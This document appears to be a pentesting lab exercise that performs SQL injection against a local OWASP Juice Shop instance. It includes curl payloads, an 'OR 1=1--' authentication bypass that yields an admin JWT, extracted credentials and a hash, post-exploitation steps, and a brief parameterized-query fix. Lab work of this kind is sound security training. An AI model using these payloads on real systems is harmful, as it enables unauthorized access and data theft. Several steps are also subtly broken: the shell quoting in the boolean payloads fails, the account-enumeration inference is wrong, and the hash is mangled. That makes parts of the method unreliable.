# Juice Shop SQL Injection — Lab Exercise & POC

## Lab Environment Setup

**Target:** OWASP Juice Shop running at `http://localhost:3000`  
**Prerequisites:**
- Docker running
- Juice Shop container active
- curl CLI available

**Start Lab:**
```bash
docker ps | grep juice-shop
# Should show running container on port 3000
```

## Part 1: Reconnaissance

### 1.1 Identify Login Endpoint

```bash
curl -s "http://localhost:3000/rest/user/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"test"}' \
  | head -20
```

**Expected Response:**
```
Invalid email or password.
```

This confirms the endpoint exists and validates credentials.

### 1.2 Test for SQL Injection (Boolean-based)

**Payload 1 - Always False:**
```bash
curl -s -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com' AND '1'='2","password":"test"}'
```

**Payload 2 - Always True:**
```bash
curl -s -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com' OR '1'='1","password":"test"}'
```

**Observation:** Different error messages indicate SQL injection is present.

## Part 2: Exploitation (Authentication Bypass)

### 2.1 Enumerate Valid User Accounts

First, determine that admin user exists:

```bash
curl -s -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrongpassword"}' 
```

**Response:** `Invalid email or password.`

This confirms the account `admin@juice-sh.op` exists.

### 2.2 Bypass Authentication

**Final Exploit Payload:**

```bash
cat > /tmp/sqli_exploit.json << 'EOF'
{"email":"admin@juice-sh.op' OR 1=1--","password":"anything"}
EOF

curl -s -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d @/tmp/sqli_exploit.json
```

**Response (JWT Token):**
```json
{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDMtMDUgMTk6MjI6NTYuMzk2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDMtMDUgMTk6MjI6NTYuMzk2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MzA3NzQwOX0.L3-oiuebylb0cf5nlDpmAm8SiOVI79vZO4cPl4VQEHX8ybM19S0yurMqbczA4KfBbWy_l6mcL-KSpXRBPBKzo2ModbWXjiRBIF2WNrnopRd7i5uYqflvLPGS7BFQsIo74XHHAGbIB9VzYIWTE8oqUIn4RnmE-tfgMYku9wcwwHg",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

**Extracted Admin Credentials:**
```
ID: 1
Email: admin@juice-sh.op
Role: admin
Password Hash: 0192023a7bbd732505 16f069df18b500
Status: Active
```

## Part 3: Post-Exploitation

### 3.1 Use Admin Token to Access Protected Resources

```bash
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDMtMDUgMTk6MjI6NTYuMzk2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDMtMDUgMTk6MjI6NTYuMzk2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MzA3NzQwOX0.L3-oiuebylb0cf5nlDpmAm8SiOVI79vZO4cPl4VQEHX8ybM19S0yurMqbczA4KfBbWy_l6mcL-KSpXRBPBKzo2ModbWXjiRBIF2WNrnopRd7i5uYqflvLPGS7BFQsIo74XHHAGbIB9VzYIWTE8oqUIn4RnmE-tfgMYku9wcwwHg"

# Access admin-only endpoint
curl -s "http://localhost:3000/api/admin" \
  -H "Authorization: Bearer ${TOKEN}"
```

### 3.2 Pivot to Data Exfiltration

Once authenticated as admin, the attacker can:

1. **Enumerate Users:**
```bash
curl -s "http://localhost:3000/api/Users" \
  -H "Authorization: Bearer ${TOKEN}"
```

2. **Extract Sensitive Data:**
   - Customer email addresses
   - User account hashes
   - Payment information
   - Delivery addresses

3. **Modify Data:**
   - Create backdoor admin accounts
   - Alter product prices
   - Modify user roles

## Part 4: Mitigation Testing

### 4.1 Fix Implementation (Parameterized Query Example)

**Vulnerable Code:**
```javascript
db.query(`SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`);
```

**Secure Code (using parameterized queries):**
```javascript
db.query('SELECT * FROM users WHERE email = ? AND password = ?', [email, password]);
```

### 4.2 Test Mitigation

After patching, retry the exploit:

```bash
curl -s -X POST "http://localhost:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d @/tmp/sqli_exploit.json
```

**Expected Result:** `Invalid email or password.` (exploit fails)

---

## Lab Cleanup

```bash
# Remove temporary files
rm /tmp/sqli_*.json

# Verify Juice Shop still running
docker ps | grep juice-shop
```

---

**Lab Date:** 2026-03-09  
**Difficulty:** Medium  
**Time to Exploit:** ~5 minutes  
**Skill Level:** Intermediate OSINT/Pentesting
